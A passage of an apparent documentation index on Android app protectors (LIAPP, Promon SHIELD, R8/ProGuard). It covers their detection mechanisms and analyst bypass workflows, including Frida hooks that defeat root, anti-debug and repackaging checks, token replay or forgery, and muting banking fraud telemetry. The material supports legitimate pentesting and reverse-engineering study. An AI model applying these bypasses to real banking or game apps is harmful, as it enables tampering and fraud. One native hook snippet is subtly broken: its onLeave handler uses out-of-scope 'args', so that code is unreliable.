statically than most commercial packers. The combination of encrypted strings in native libraries, non-distinctive library naming, and absence of APKiD signatures means identification often relies on:</p> <ul> <li>Behavioral observation during dynamic analysis (detection dialogs, specific crash patterns)</li> <li>Presence of <code>com.lockincomp</code> references in non-encrypted portions of the APK</li> <li>Server-side communication patterns to LIAPP licensing endpoints</li> <li>Comparison with known LIAPP-protected apps from the Korean market</li> </ul>"},{"location":"packers/liapp/#protection-mechanisms","title":"Protection Mechanisms","text":""},{"location":"packers/liapp/#dex-encryption","title":"DEX Encryption","text":"<p>Application DEX files are encrypted and loaded through a native decryption routine at runtime. The encryption covers the full DEX payload rather than selective class-level encryption, requiring the entire DEX to be decrypted into memory before class loading proceeds.</p>"},{"location":"packers/liapp/#source-code-obfuscation","title":"Source Code Obfuscation","text":"<p>Beyond encryption, LIAPP applies obfuscation transforms to the DEX bytecode including name mangling, control flow alteration, and dead code insertion. This ensures that even after DEX recovery, the code resists straightforward decompilation.</p>"},{"location":"packers/liapp/#string-encryption","title":"String Encryption","text":"<p>Strings are encrypted using XOR-based schemes implemented in the native layer. String decryption happens through JNI calls from Java code into the native library, which decrypts and returns the plaintext. The XOR keys are embedded in the native binary with their own layer of obfuscation, requiring IDA Pro or Ghidra analysis to extract.</p>"},{"location":"packers/liapp/#jni-library-protection","title":"JNI Library Protection","text":"<p>Native <code>.so</code> files shipped with the application are encrypted within the APK. LIAPP decrypts them at load time before <code>dlopen</code>. This protects both the developer's own JNI code and LIAPP's runtime security libraries from static extraction.</p>"},{"location":"packers/liapp/#anti-debugging","title":"Anti-Debugging","text":"<ul> <li>ptrace-based debugger detection</li> <li>JDWP connection monitoring</li> <li>TracerPid checks via <code>/proc/self/status</code></li> <li>Timing-based detection (execution speed anomalies indicating single-stepping)</li> </ul>"},{"location":"packers/liapp/#anti-tampering","title":"Anti-Tampering","text":"<ul> <li>APK signature verification against expected certificate</li> <li>DEX file integrity checks (checksum validation)</li> <li>Native library hash verification</li> <li>Detects modification of any protected component</li> </ul>"},{"location":"packers/liapp/#anti-hooking","title":"Anti-Hooking","text":"<ul> <li>Detects Frida through multiple vectors (port scanning, <code>/proc/maps</code> inspection, named pipe checks)</li> <li>Xposed framework detection (class presence, stack trace analysis)</li> <li>Substrate/Cydia detection on older devices</li> <li>Inline hook detection on native functions</li> </ul>"},{"location":"packers/liapp/#root-detection","title":"Root Detection","text":"<p>LIAPP's root detection is notably aggressive:</p> <ul> <li>Standard <code>su</code> binary and root management app checks</li> <li>Magisk root-masking detection -- specifically targets MagiskHide and Shamiko, detecting root even when hidden</li> <li>SELinux status verification</li> <li>System partition integrity checks</li> <li>Zygisk module detection</li> </ul> <p>This makes LIAPP one of the few protectors that reliably detects Magisk-hidden root, placing it alongside Promon SHIELD and Arxan in detection sophistication.</p>"},{"location":"packers/liapp/#vmemulator-detection","title":"VM/Emulator Detection","text":"<ul> <li>Build property analysis (hardware, manufacturer, model, fingerprint)</li> <li>Sensor availability and behavior checks</li> <li>Telephony state inspection</li> <li>File system artifacts specific to emulators</li> <li>Timing-based checks that detect virtualization overhead</li> </ul>"},{"location":"packers/liapp/#repackaging-prevention","title":"Repackaging Prevention","text":"<p>Certificate pinning against the original signing key combined with integrity verification of the APK structure. Repackaging with a different key triggers detection at startup.</p>"},{"location":"packers/liapp/#memory-integrity-monitoring","title":"Memory Integrity Monitoring","text":"<p>Continuous runtime monitoring of memory regions containing protected code. Detects:</p> <ul> <li>Memory patching (writing to <code>.text</code> segments)</li> <li>Breakpoint insertion (INT3/BRK instruction detection)</li> <li>Memory dumping attempts via <code>/proc/self/mem</code> access monitoring</li> </ul>"},{"location":"packers/liapp/#process-scanning","title":"Process Scanning","text":"<p>Scans the process list and <code>/proc</code> filesystem for known analysis tools, debuggers, and hooking frameworks. This includes detection of:</p> <ul> <li>frida-server process names (including renamed binaries)</li> <li>IDA remote debugger server</li> <li>GDB server</li> <li>Memory dumping utilities</li> </ul>"},{"location":"packers/liapp/#server-side-token-verification","title":"Server-Side Token Verification","text":"<p>LIAPP implements server-side authentication token verification as a defense-in-depth layer. Even after bypassing all client-side checks (root detection, anti-hooking, memory integrity), the app communicates with LIAPP's backend to validate an integrity token. If the server determines the client environment is compromised, the app functionality is restricted server-side.</p> <p>This architecture means that a fully patched local bypass may still fail at the application level because the server rejects requests from tampered clients. Defeating this requires either:</p> <ul> <li>Replaying valid tokens captured from a clean device</li> <li>Reversing the token generation algorithm and forging valid tokens</li> <li>Intercepting and modifying the server response to always return \"valid\"</li> </ul>"},{"location":"packers/liapp/#unity-engine-protection-liapp-for-game","title":"Unity Engine Protection (LIAPP for Game)","text":"<p>LIAPP for Game is a dedicated product targeting Unity-based games:</p> <ul> <li><code>libil2cpp.so</code> encryption and integrity verification</li> <li>IL2CPP metadata protection</li> <li>Memory value modification detection (anti-GameGuardian)</li> <li>Speed hack detection</li> <li>Game asset integrity checks</li> </ul>"},{"location":"packers/liapp/#unpacking-methodology","title":"Unpacking Methodology","text":"<p>LIAPP is described on modding forums as \"one of the toughest anti-cheat systems\" encountered in Android reverse engineering. The difficulty stems from the layered defense architecture:</p> <pre><code>Layer 1: Root/emulator detection (blocks execution on hostile environment)\nLayer 2: Anti-hooking/anti-debugging (prevents dynamic analysis tools)\nLayer 3: Memory integrity monitoring (detects runtime patching)\nLayer 4: Process scanning (detects analysis tools)\nLayer 5: DEX/SO encryption (prevents static analysis)\nLayer 6: XOR string encryption in native (requires IDA/Ghidra RE)\nLayer 7: Server-side token verification (blocks tampered clients remotely)\n</code></pre> <p>Bypassing layers 1-4 requires IDA Pro and C++ reverse engineering expertise to understand and patch the native security library. Layer 6 requires manual XOR key extraction from the native binary. Layer 7 introduces a server-side component that cannot be defeated through local patching alone.</p>"},{"location":"packers/liapp/#no-comprehensive-public-bypass","title":"No Comprehensive Public Bypass","text":"<p>Unlike AppSealing which has dedicated tools like AppPealing, no comprehensive public bypass tool exists for LIAPP. The XDA Forums contain threads discussing LIAPP and AppSealing unpacking, but no complete automated solution has been published. Each bypass attempt documented publicly addresses only a subset of LIAPP's protection layers.</p> <p>This absence of public tooling means analysts must approach LIAPP-protected targets with manual native reverse engineering:</p> <pre><code>1. Extract the native security library from the APK\n2. Load in IDA Pro or Ghidra\n3. Identify XOR-encrypted string blobs and decrypt them\n4. Map out the detection check functions from the decrypted strings\n5. Patch or hook each detection function individually\n6. Handle server-side token verification separately\n</code></pre>"},{"location":"packers/liapp/#frida-dexdump-limitations","title":"frida-dexdump Limitations","text":"<p>Standard frida-dexdump can recover decrypted DEX if the analyst first bypasses the anti-Frida and anti-root checks. However, reaching that point requires neutralizing multiple native-level detection mechanisms that specifically target Frida. ZygiskFrida injection (to avoid ptrace-based detection) combined with process name spoofing improves the chances of surviving long enough to dump.</p>"},{"location":"packers/liapp/#comparison-with-other-protectors","title":"Comparison with Other Protectors","text":"Feature LIAPP DexGuard DexProtector Promon SHIELD AppSealing DEX encryption Yes (full) Yes (class-level) Yes No Yes (selective) String encryption XOR in native AES/XOR polymorphic White-box dynamic keys Externalized to native Weak Anti-hooking Aggressive Comprehensive Comprehensive Comprehensive Basic Root detection Magisk-aware Comprehensive Comprehensive Magisk-aware Moderate Server-side verification Yes No No No No Memory monitoring Yes No Partial Yes No Unity game support Yes (dedicated product) No Limited No Yes Public bypass tools None Limited Limited Limited Yes (AppPealing) Unpacking difficulty Hard Medium-Hard Medium-Hard Medium (bypass) Low-Medium <p>LIAPP functions as a hybrid packer+RASP, comparable to DexProtector's full protection suite in scope. In the Korean market, it serves as the equivalent of Promon SHIELD for European banking. The server-side token verification layer is unique among the documented packers and adds a dimension that purely client-side protectors lack.</p>"},{"location":"packers/liapp/#industry-usage","title":"Industry Usage","text":"<p>LIAPP is primarily deployed in:</p> <ul> <li>Korean banking -- KBPay (KB Financial Group), NH Bank (NongHyup), and other major Korean financial institutions</li> <li>Telecommunications -- U+ Customer Center (LG U+) and carrier-affiliated apps</li> <li>Gaming -- Korean game publishers using LIAPP for Game to protect Unity titles</li> <li>Government and enterprise -- Korean public sector and corporate applications requiring certified protection</li> </ul> <p>The Korean financial regulatory environment drives adoption, as banks must demonstrate application-level security controls. LIAPP's Gartner recognition and domestic presence make it the default choice for Korean financial institutions, similar to how Promon SHIELD dominates European banking.</p>"},{"location":"packers/liapp/#analyst-workflow","title":"Analyst Workflow","text":"<pre><code>1. Attempt APKiD -&gt; no LIAPP signature (issue #339 pending)\n2. Manual inspection: look for com.lockincomp references, XOR-encrypted native strings\n3. If server-side verification present -&gt; capture valid tokens from clean device first\n4. Use ZygiskFrida for stealth injection (avoid ptrace detection)\n5. Hook anti-root and anti-hooking checks in native library (requires prior IDA analysis)\n6. Once checks bypassed -&gt; frida-dexdump for DEX recovery\n7. Decrypt XOR strings from native library using extracted keys\n8. For Unity games -&gt; extract and analyze decrypted libil2cpp.so\n9. Handle server-side token replay/forgery if app functionality depends on it\n</code></pre> <p>Physical device with Magisk + Zygisk + ZygiskFrida is strongly recommended. Emulators are likely to be detected and blocked. Even with hidden root (Shamiko), LIAPP's Magisk-masking detection may trigger, requiring native-level patches to the detection routine itself.</p>"},{"location":"packers/liapp/#references","title":"References","text":"<ul> <li>LIAPP Official</li> <li>Lockin Company</li> <li>APKiD -- Issue #339 (LIAPP Detection)</li> <li>APKiD -- Packer Detection</li> <li>Gartner -- Application Shielding Market</li> <li>frida-dexdump -- Automated DEX Dumping</li> <li>ZygiskFrida -- Stealth Frida Injection</li> <li>XDA Forums -- LIAPP and AppSealing Discussion</li> <li>IDA Pro -- Native Analysis</li> </ul>"},{"location":"packers/promon/","title":"Promon SHIELD","text":"<p>Promon SHIELD is a commercial RASP (Runtime Application Self-Protection) solution developed by Promon (Oslo, Norway). Unlike traditional packers that encrypt DEX bytecode, SHIELD focuses on runtime integrity checks, environment detection, and anti-tampering. It is the dominant mobile app protection solution in European banking, reportedly used by over 50% of leading European financial institutions.</p>"},{"location":"packers/promon/#vendor-information","title":"Vendor Information","text":"Attribute Details Developer Promon AS Origin Oslo, Norway Type Commercial RASP / Application Shielding Platforms Android, iOS, Desktop (Windows, macOS) Products SHIELD for Mobile, SHIELD for Desktop, SDK Protection, IP Protection Pro Founded 2006"},{"location":"packers/promon/#rasp-vs-packer","title":"RASP vs Packer","text":"<p>Promon SHIELD operates fundamentally differently from packers like DexGuard or Virbox.</p> Aspect RASP (Promon SHIELD) Packer (DexGuard, Virbox) Primary function Runtime environment monitoring Code transformation and encryption DEX encryption No Yes String encryption No (externalizes to native layer) Yes (inline decryption methods) Code virtualization No Yes (Virbox), optional (DexGuard) Anti-debugging Core feature Secondary feature Root/hook detection Core feature Secondary feature Overlay protection Yes No Screen capture blocking Yes No Integration model Injected native library + config Build-time transformation <p>SHIELD wraps an application by injecting a native library that loads before anything else in the process. The library performs all checks at the native level, making Java-layer bypasses insufficient. The app's own code remains largely unmodified -- the protection is external rather than woven into the bytecode.</p>"},{"location":"packers/promon/#identification","title":"Identification","text":""},{"location":"packers/promon/#apkid-detection","title":"APKiD Detection","text":"<p>APKiD detects Promon SHIELD through ELF segment analysis of native libraries:</p> <pre><code>packer : Promon Shield\n</code></pre> <p>Detection is segment-based rather than filename-based, since library names are randomized in newer versions.</p>"},{"location":"packers/promon/#file-artifacts","title":"File Artifacts","text":"Artifact Description Native library Randomized name (e.g., <code>libenhefoocjfcl.so</code>, <code>libniiblkgocjbb.so</code>). Legacy versions used <code>libshield.so</code> or <code>libshield.XXXXXXXX.so</code> Config file <code>config-encrypt.txt</code> in assets -- encrypted configuration consumed by the native library Mapping file <code>pbi.bin</code> in assets -- encrypted mapping data Architecture Typically <code>arm64-v8a</code>, may include <code>armeabi-v7a</code> and <code>x86</code> Library size Noticeably large compared to typical app native libraries"},{"location":"packers/promon/#java-side-indicators","title":"Java-Side Indicators","text":"<p>Promon SHIELD externalizes strings and class initialization to native methods. A bridge class (obfuscated name, e.g., <code>C6539Z</code>) exposes two native methods:</p> <pre><code>native String m1788a(int i);\nnative void m1787a(Class cls, int i);\n</code></pre> <p>The first retrieves strings by index from the native layer. The second initializes classes by ID. The library name itself is XOR-encrypted before being passed to <code>System.loadLibrary()</code>.</p> <p>If decompiled code shows string retrieval through indexed native calls rather than inline string literals or Java-based decryption methods, it is likely Promon SHIELD.</p>"},{"location":"packers/promon/#distinguishing-from-other-protectors","title":"Distinguishing from Other Protectors","text":"<ul> <li>No DEX encryption: classes.dex is readable in JADX (strings are missing, but structure is intact)</li> <li>No <code>o</code>/<code>oo</code>/<code>ooo</code> decryption classes: unlike DexGuard, there are no Java string decryption stubs</li> <li>Single large native library: unlike Chinese packers that have recognizable library names (<code>libjiagu.so</code>, <code>libshella.so</code>)</li> <li>OLLVM-obfuscated native code: the native library uses Obfuscator-LLVM with control flow flattening</li> </ul>"},{"location":"packers/promon/#protection-mechanisms","title":"Protection Mechanisms","text":""},{"location":"packers/promon/#native-library-lifecycle","title":"Native Library Lifecycle","text":"<ol> <li><code>.init_array</code> constructor executes before <code>JNI_OnLoad</code></li> <li>Constructor unpacks the encrypted <code>.text</code> section and resolves imports dynamically via <code>dlsym()</code> and direct syscalls (<code>SVC 0</code>)</li> <li>Configuration is decrypted from <code>config-encrypt.txt</code></li> <li>Environment checks begin immediately</li> <li>If checks pass, the app's original code proceeds normally</li> </ol>"},{"location":"packers/promon/#anti-debugging","title":"Anti-Debugging","text":"<p>Process isolation via ptrace lock:</p> <ol> <li><code>fork()</code> creates a child process</li> <li>Parent calls <code>prctl(PR_SET_PTRACER)</code> to restrict tracing to the child only</li> <li>Child attaches to parent via <code>ptrace(PTRACE_ATTACH)</code></li> <li><code>prctl(PR_SET_DUMPABLE, false)</code> blocks external debuggers</li> </ol> <p>This prevents any other process from attaching a debugger to the protected app. The child process acts as a watchdog.</p> <p>JDWP disablement:</p> <p>Patches <code>art::JDWP::JdwpState::HandlePacket()</code> at the ART runtime level to kill Java debugging entirely. This goes beyond checking <code>ro.debuggable</code> -- it neutralizes the debug protocol handler in-process.</p>"},{"location":"packers/promon/#root-detection","title":"Root Detection","text":"<p>Checks over 20 system properties and file paths:</p> Category Examples System properties <code>ro.debuggable</code>, <code>ro.secure</code>, <code>persist.sys.root_access</code>, <code>service.adb.root</code> Su binaries <code>/system/xbin/su</code>, <code>/system/bin/su</code>, <code>/sbin/su</code> Magisk artifacts <code>/data/adb/magisk/magisk</code>, <code>/data/data/com.topjohnwu.magisk</code> SuperSU artifacts <code>/init.supersu.rc</code>, SuperSU package paths Other root tools Kingroot paths, root management app packages <p>Directory watches via <code>inotify_add_watch()</code> monitor <code>/bin</code>, <code>/system/bin</code>, <code>/system/xbin</code>, and <code>/vendor/bin</code> for changes -- detecting root tools installed after the app starts.</p>"},{"location":"packers/promon/#hooking-framework-detection","title":"Hooking Framework Detection","text":"Framework Detection Method Frida Scans <code>/proc/self/maps</code> for <code>libFridaGadget.so</code>, checks memory page integrity Xposed Looks for <code>libxposed_art.so</code> in memory, checks for <code>art::mirror::ArtMethod::EnableXposedHook()</code> export symbol Cydia Substrate Scans for <code>libsubstrate.so</code> and <code>libsubstrate-dvm.so</code> in loaded libraries Memory patching Validates memory page contents -- modifications trigger process termination"},{"location":"packers/promon/#emulator-detection","title":"Emulator Detection","text":"<p>Checks system properties that leak virtual hardware:</p> <ul> <li><code>ro.kernel.qemu</code> (QEMU-based emulators)</li> <li><code>ro.hardware</code> (goldfish, ranchu)</li> <li>Device manufacturer, model, and hardware strings</li> <li>ChromeOS and virtual machine indicators</li> <li>Telephony state anomalies</li> <li>Hardware sensor availability</li> </ul>"},{"location":"packers/promon/#repackaging-detection","title":"Repackaging Detection","text":"<ol> <li>Opens the installed <code>base.apk</code> directly via <code>openat()</code> syscall (bypasses Java file APIs)</li> <li>Parses the APK signing block to extract signing certificates</li> <li>Compares against expected certificate embedded in the native library</li> <li>Verifies <code>libshield.so</code> checksum before proceeding with other checks</li> </ol> <p>The syscall-based file access makes it harder to intercept with standard Java hooks.</p>"},{"location":"packers/promon/#overlay-detection","title":"Overlay Detection","text":"<p>Detects if another application draws over the protected app's window. Prevents tapjacking and phishing overlays that attempt to capture user input. The app can block interaction, alert the user, or terminate when an overlay is detected.</p>"},{"location":"packers/promon/#screen-capture-prevention","title":"Screen Capture Prevention","text":"<p>Blocks screenshots, screen recordings, and screen mirroring of the protected app. Uses <code>FLAG_SECURE</code> and additional native-level enforcement to prevent data leakage through screen capture.</p>"},{"location":"packers/promon/#dynamic-imports-and-syscalls","title":"Dynamic Imports and Syscalls","text":"<p>The native library avoids standard libc imports for security-critical operations. Functions resolved at runtime via <code>dlsym()</code> or invoked through direct <code>SVC 0</code> syscalls include:</p> <pre><code>ptrace, prctl, fork, execl, __system_property_get,\ndlopen, dladdr, inotify_init, inotify_add_watch,\neventfd, dl_iterate_phdr, openat, read, write, mmap\n</code></pre> <p>Direct syscalls bypass any LD_PRELOAD or linker-level hooking.</p>"},{"location":"packers/promon/#native-code-obfuscation","title":"Native Code Obfuscation","text":"<p>The SHIELD library itself is protected with:</p> <ul> <li>OLLVM control flow flattening: function CFGs are destroyed and replaced with dispatcher-based execution</li> <li>Packed .text section: encrypted at rest, unpacked by <code>.init_array</code> constructor at load time</li> <li>No readable string table: strings resolved dynamically</li> <li>Stripped symbols: no exported function names beyond JNI entry points</li> </ul>"},{"location":"packers/promon/#unpacking-methodology","title":"Unpacking Methodology","text":""},{"location":"packers/promon/#frida-based-string-index-enumeration","title":"Frida-Based String Index Enumeration","text":"<p>Since SHIELD externalizes all strings to native methods accessed by index, you can brute-force the index space to reconstruct the string table:</p> <pre><code>Java.perform(function() {\n    var bridge = Java.use(\"com.target.app.C6539Z\");\n    for (var i = 0; i &lt; 5000; i++) {\n        try {\n            var s = bridge.m1788a(i);\n            if (s !== null &amp;&amp; s.length &gt; 0) {\n                console.log(\"idx \" + i + \" -&gt; \" + s);\n            }\n        } catch(e) {}\n    }\n});\n</code></pre> <p>The bridge class name and method name will differ per app -- locate them by searching for classes with native methods that take a single <code>int</code> parameter and return <code>String</code>.</p>"},{"location":"packers/promon/#bypassing-ptrace-lock","title":"Bypassing ptrace Lock","text":"<p>The fork-and-attach pattern can be defeated by:</p> <ol> <li>Patching the native library: NOP out the <code>fork()</code> and <code>ptrace()</code> calls in the unpacked <code>.text</code> section</li> <li>Early Frida injection: attach Frida before the native library's <code>.init_array</code> runs by spawning with <code>frida -f</code> and hooking <code>android_dlopen_ext</code> to intercept the library load</li> <li>Hooking <code>fork()</code>: return 0 (pretend to be the child) or -1 (pretend fork failed) to prevent the watchdog process from starting</li> </ol>"},{"location":"packers/promon/#bypassing-root-detection","title":"Bypassing Root Detection","text":"<pre><code>Java.perform(function() {\n    var Runtime = Java.use(\"java.lang.Runtime\");\n    Runtime.exec.overload(\"java.lang.String\").implementation = function(cmd) {\n        if (cmd.indexOf(\"su\") !== -1 || cmd.indexOf(\"which\") !== -1) {\n            throw Java.use(\"java.io.IOException\").$new(\"not found\");\n        }\n        return this.exec(cmd);\n    };\n});\n</code></pre> <p>For native-level checks, intercept <code>__system_property_get</code> via <code>Interceptor.attach</code>:</p> <pre><code>var prop_get = Module.findExportByName(null, \"__system_property_get\");\nInterceptor.attach(prop_get, {\n    onEnter: function(args) {\n        this.name = args[0].readUtf8String();\n    },\n    onLeave: function(retval) {\n        if (this.name === \"ro.debuggable\" || this.name === \"ro.secure\") {\n            args[1].writeUtf8String(\"0\");\n        }\n    }\n});\n</code></pre>"},{"location":"packers/promon/#bypassing-repackaging-detection","title":"Bypassing Repackaging Detection","text":"<p>The <code>promon-reversal</code> project demonstrates that APK signature verification can be bypassed by:</p> <ol> <li>Extracting the original signing certificate from the native library's embedded data</li> <li>Hooking the certificate comparison at the native level</li> <li>Returning the expected certificate when SHIELD performs its check</li> </ol>"},{"location":"packers/promon/#native-library-patching","title":"Native Library Patching","text":"<p>For persistent bypass (lab environment):</p> <pre><code>1. Extract the APK\n2. Identify the SHIELD library (randomized name, largest .so in lib/)\n3. Load in Ghidra/IDA -&gt; locate .init_array entry point\n4. Trace from init_array through the unpacking routine\n5. Dump the unpacked .text section at runtime\n6. Patch detection routines (NOP out fork/ptrace/property checks)\n7. Replace the library, resign the APK\n8. Install with signature verification bypass (Frida hook or debug certificate)\n</code></pre> <p>This approach requires re-bypassing the repackaging check since the modified library will fail its own integrity verification.</p>"},{"location":"packers/promon/#magisk-based-approach","title":"Magisk-Based Approach","text":"<p>MagiskHide (deprecated) or Shamiko/Zygisk-based hiding can prevent SHIELD from seeing root artifacts in the filesystem and process list. Combined with a Frida server renamed and running on a non-default port, this avoids the most common detection vectors.</p>"},{"location":"packers/promon/#banking-app-context","title":"Banking App Context","text":"<p>Promon SHIELD is the primary protection for European banking and financial apps. During mobile penetration tests of banking applications, SHIELD is the most frequently encountered defense layer.</p> <p>Key considerations for pentesters:</p> Aspect Detail Prevalence Over 50% of top European banks reportedly use Promon SHIELD Typical deployment Combined with certificate pinning, obfuscation (often R8/ProGuard), and server-side fraud detection Response behavior Configurable per customer -- may silently report, block functionality, or force-close the app Multi-layered Banks often stack SHIELD with DexGuard or proprietary obfuscation Server reporting Detection events may be reported server-side, potentially flagging the tester's device or account <p>When assessing a SHIELD-protected banking app, disable telemetry reporting hooks early to avoid triggering server-side fraud alerts during testing.</p>"},{"location":"packers/promon/#comparison-with-other-protectors","title":"Comparison with Other Protectors","text":"Feature Promon SHIELD DexGuard Virbox Chinese Packers Primary approach RASP (runtime checks) Code transformation DEX virtualization DEX encryption DEX encryption No Yes Yes (VM-based) Yes String protection Native externalization AES/XOR decryption VM-based Native layer XOR Anti-debugging Comprehensive (ptrace lock, JDWP patch) Comprehensive Moderate Basic Root detection Comprehensive (20+ checks, inotify) Moderate Moderate Basic Overlay protection Yes No No No Screen capture block Yes No No No Hooking detection Frida, Xposed, Substrate, memory integrity Frida, Xposed ptrace, debug flags ptrace Bypass difficulty Medium-High (native-heavy) Medium (Frida hooks effective) High (VM interpretation) Low (DEX dump) Typical customers European banks, fintech Enterprise, some malware Chinese market, some malware Chinese market, malware"},{"location":"packers/promon/#analyst-workflow","title":"Analyst Workflow","text":"<pre><code>1. Run APKiD -&gt; confirm \"Promon Shield\" detection on the native library\n2. Open in JADX -&gt; note intact class structure but missing string literals\n3. Locate the bridge class with native int-&gt;String methods\n4. Spawn app with Frida (-f flag to attach early)\n5. Hook android_dlopen_ext to intercept SHIELD library loading\n6. Enumerate string indices via the bridge class native method\n7. Hook fork() and ptrace() to disable the anti-debug watchdog\n8. Hook __system_property_get to feed clean values for root checks\n9. If repackaging needed -&gt; bypass certificate verification at native level\n10. For SSL pinning -&gt; standard Frida SSL pinning bypass after RASP is neutralized\n</code></pre> <p>The critical difference from packer analysis: there is no DEX to unpack. The app code is already readable. The challenge is getting the app to run in an instrumented environment, not recovering hidden code.</p>"},{"location":"packers/promon/#references","title":"References","text":"<ul> <li>Promon SHIELD for Mobile</li> <li>Promon SHIELD 7.0 Release</li> <li>promon-reversal -- Analysis and PoC Bypass</li> <li>APKiD Promon Detection (Issue #267)</li> <li>APKiD Promon SHIELD at 34C3 (Issue #72)</li> <li>Honey, I Shrunk Your App Security (DIMVA 2018)</li> <li>APKiD -- Android Application Identifier</li> </ul>"},{"location":"packers/r8-proguard/","title":"R8 / ProGuard","text":"<p>R8 and ProGuard are code transformation tools that ship with the Android build toolchain. They are technically obfuscators, not packers -- they do not encrypt DEX files, wrap native loaders, or perform any runtime self-protection. However, they are the most commonly encountered code transformation in Android reverse engineering, and understanding their output is a prerequisite for analyzing virtually any production Android application.</p>"},{"location":"packers/r8-proguard/#overview","title":"Overview","text":"Attribute ProGuard R8 Developer Guardsquare (Eric Lafortune) Google Type Open-source obfuscator/optimizer Built into Android Gradle Plugin Status Legacy (still functional) Default since AGP 3.4.0 (2019) Rule format <code>-keep</code> rules in <code>proguard-rules.pro</code> Same rule format as ProGuard Implementation Separate JAR, processes .class files Integrated into D8 dexer, processes directly to DEX <p>R8 replaced ProGuard as the default code shrinker and obfuscator in the Android Gradle Plugin. Both use the same configuration file format (<code>proguard-rules.pro</code>), so from a rule-writing perspective they are interchangeable. The key difference is implementation: R8 operates directly on DEX bytecode as part of the D8 compilation pipeline, while ProGuard operated on Java bytecode before dexing.</p> <p>For reverse engineers, this distinction rarely matters. The output of both tools produces the same general patterns in decompiled code. R8 tends to be more aggressive with certain optimizations (inlining, class merging), which can make decompiled output slightly different.</p>"},{"location":"packers/r8-proguard/#what-they-do","title":"What They Do","text":""},{"location":"packers/r8-proguard/#name-obfuscation","title":"Name Obfuscation","text":"<p>The most visible transformation. Classes, methods, and fields are renamed to short, meaningless identifiers:</p> <pre><code>com.example.myapp.network.ApiClient  -&gt;  a.b.c\ncom.example.myapp.network.ApiClient.fetchUserProfile()  -&gt;  a.b.c.a()\ncom.example.myapp.model.UserProfile  -&gt;  a.b.d\ncom.example.myapp.model.UserProfile.displayName  -&gt;  a.b.d.a\ncom.example.myapp.model.UserProfile.emailAddress  -&gt;  a.b.d.b\n</code></pre> <p>Names are assigned alphabetically within each scope. The first class in a package becomes <code>a</code>, the second <code>b</code>, and so on. After <code>z</code>, naming continues with <code>aa</code>, <code>ab</code>, etc. This scheme is deterministic per build but changes between releases as code is added or removed.</p>"},{"location":"packers/r8-proguard/#code-shrinking-tree-shaking","title":"Code Shrinking (Tree Shaking)","text":"<p>Removes unreachable code. Starting from entry points (activities, services, content providers, broadcast receivers declared in the manifest), R8/ProGuard traces all reachable code paths and discards everything else. This eliminates:</p> <ul> <li>Unused classes and interfaces</li> <li>Unused methods and fields</li> <li>Unused code branches within methods</li> <li>Unused library code pulled in as dependencies</li> </ul> <p>For analysts, this means the APK only contains code that is actually reachable. Dead library code and unused features are stripped, reducing noise in the decompiled output.</p>"},{"location":"packers/r8-proguard/#optimization","title":"Optimization","text":"<p>R8 performs several bytecode-level optimizations:</p> Optimization Effect on Decompiled Code Method inlining Small methods disappear; their code appears at call sites Devirtualization Virtual calls replaced with direct calls when only one implementation exists Constant propagation Computed constants replaced with literal values Dead branch removal Unreachable if/else branches eliminated Enum unboxing Enum classes replaced with int constants (R8 only, with full mode) Class merging Separate classes merged into one when possible (R8 only) Outlining Repeated code sequences extracted into shared methods (R8 only)"},{"location":"packers/r8-proguard/#what-they-do-not-do","title":"What They Do NOT Do","text":"<p>R8 and ProGuard provide zero runtime protection:</p> <ul> <li>No string encryption -- all string literals remain as plaintext in the DEX</li> <li>No class/DEX encryption -- the DEX file is fully readable</li> <li>No anti-debugging -- no detection of debuggers, Frida, or Xposed</li> <li>No anti-tampering -- no signature verification or integrity checks</li> <li>No root/emulator detection -- no environmental checks</li> <li>No native code protection -- JNI libraries are untouched</li> <li>No control flow obfuscation -- code logic remains structurally intact</li> </ul> <p>This is the fundamental distinction between R8/ProGuard and tools like DexGuard, Virbox, or Chinese packers. If an APK only uses R8/ProGuard, all strings, API calls, URLs, and logic are visible in static analysis. The only challenge is navigating renamed identifiers.</p>"},{"location":"packers/r8-proguard/#reverse-engineering-r8proguard-output","title":"Reverse Engineering R8/ProGuard Output","text":""},{"location":"packers/r8-proguard/#reading-obfuscated-code","title":"Reading Obfuscated Code","text":"<p>Typical R8/ProGuard output in jadx:</p> <pre><code>package a.b;\n\npublic class c {\n    private final d a;\n    private String b;\n\n    public c(d dVar) {\n        this.a = dVar;\n    }\n\n    public void a(String str) {\n        this.b = str;\n        this.a.a(\"https://api.example.com/user\", str, new a.b.e() {\n            @Override\n            public void a(String str2) {\n                f.a(str2);\n            }\n\n            @Override\n            public void b(Exception exc) {\n                Log.e(\"NetClient\", exc.getMessage());\n            }\n        });\n    }\n}\n</code></pre> <p>The class and method names are meaningless, but the string literals (<code>\"https://api.example.com/user\"</code>, <code>\"NetClient\"</code>) and Android framework calls (<code>Log.e</code>) are fully visible. This is the key advantage for analysts: R8/ProGuard cannot hide what the code actually does.</p>"},{"location":"packers/r8-proguard/#using-mappingtxt","title":"Using mapping.txt","text":"<p>When a build produces an R8/ProGuard-obfuscated APK, it also generates a <code>mapping.txt</code> file that maps obfuscated names back to original names. This file is used for crash report deobfuscation (uploaded to Google Play Console or Crashlytics).</p> <p>Format:</p> <pre><code>com.example.myapp.network.ApiClient -&gt; a.b.c:\n    okhttp3.OkHttpClient httpClient -&gt; a\n    java.lang.String baseUrl -&gt; b\n    void fetchUserProfile(java.lang.String) -&gt; a\n    void handleResponse(okhttp3.Response) -&gt; b\ncom.example.myapp.model.UserProfile -&gt; a.b.d:\n    java.lang.String displayName -&gt; a\n    java.lang.String emailAddress -&gt; b\n</code></pre> <p>Analysts occasionally obtain <code>mapping.txt</code> through:</p> <ul> <li>Leaked build artifacts (CI/CD misconfigurations, exposed storage buckets)</li> <li>Google Play Console access (internal assessments)</li> <li>Bundled accidentally in the APK itself (rare but happens)</li> <li>Firebase Crashlytics storage (if accessible)</li> </ul> <p>jadx can apply mapping files directly via <code>File &gt; Load mappings</code>.</p>"},{"location":"packers/r8-proguard/#jadx-deobfuscation-features","title":"jadx Deobfuscation Features","text":"<p>jadx provides built-in deobfuscation that renames classes and methods based on usage patterns, even without <code>mapping.txt</code>:</p> <ul> <li>Auto-rename (<code>--deobf</code> flag or <code>Preferences &gt; Deobfuscation</code>): assigns readable names based on heuristics</li> <li>Type-based renaming: when a field is assigned from <code>getSharedPreferences()</code>, jadx can infer the field likely holds preferences</li> <li>Interface method propagation: if an obfuscated class implements <code>View.OnClickListener</code>, jadx knows the <code>a()</code> method is actually <code>onClick()</code></li> </ul>"},{"location":"packers/r8-proguard/#recovering-original-names","title":"Recovering Original Names","text":"<p>Even without mapping files, many original names survive obfuscation or can be inferred:</p> <p>String References</p> <p>Log tags, exception messages, and debug strings often reveal the original purpose:</p> 